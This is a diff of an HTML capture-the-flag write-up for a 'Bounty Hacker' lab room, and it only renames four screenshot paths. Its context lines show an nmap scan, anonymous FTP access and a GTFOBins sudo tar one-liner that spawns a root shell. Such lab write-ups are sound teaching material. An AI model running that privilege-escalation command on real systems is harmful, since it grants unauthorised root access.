@@ -22,7 +22,7 @@
 
       <h2>🔍 Nmap Scan</h2>
       <pre><code>nmap -sV -sS -sC 10.10.16.96 -oA bounty_hacker</code></pre>
-      <img src="../assets/cowboyhacker/nmap.png" alt="nmap scan results" />
+      <img src="../assets/cowboyhacker/cowboyhacker.png" alt="nmap scan results" />
 
       <p>Open ports found:</p>
       <ul>
@@ -43,7 +43,7 @@ Name (10.10.16.96:svfear): anonymous
 -rw-rw-r--    1 ftp ftp 68  Jun 07 2020 task.txt
 </code></pre>
 
-      <img src="../assets/cowboyhacker/ftp-listing.png" alt="ftp file listing" />
+      <img src="../assets/cowboyhacker/files.png" alt="ftp file listing" />
 
       <p>
         The <strong>task.txt</strong> file revealed the username <code>lin</code>,
@@ -73,7 +73,7 @@ User lin may run the following commands on ip-10-10-16-96:
       <p>Using <a href="https://gtfobins.github.io/" target="_blank">GTFOBins</a>, we found a tar exploit to gain root:</p>
       <pre><code>sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh</code></pre>
 
-      <img src="../assets/cowboyhacker/root-shell.png" alt="root shell obtained" />
+      <img src="../assets/cowboyhacker/privesc.png" alt="root shell obtained" />
 
       <p>Success! We are root.</p>
       <pre><code># cd /root
@@ -81,7 +81,7 @@ User lin may run the following commands on ip-10-10-16-96:
 root.txt  snap
 </code></pre>
 
-      <img src="../assets/cowboyhacker/root-flag.png" alt="root flag" />
+      <img src="../assets/cowboyhacker/done.png" alt="root flag" />
 
       <h2>🏁 Conclusion</h2>
       <p>
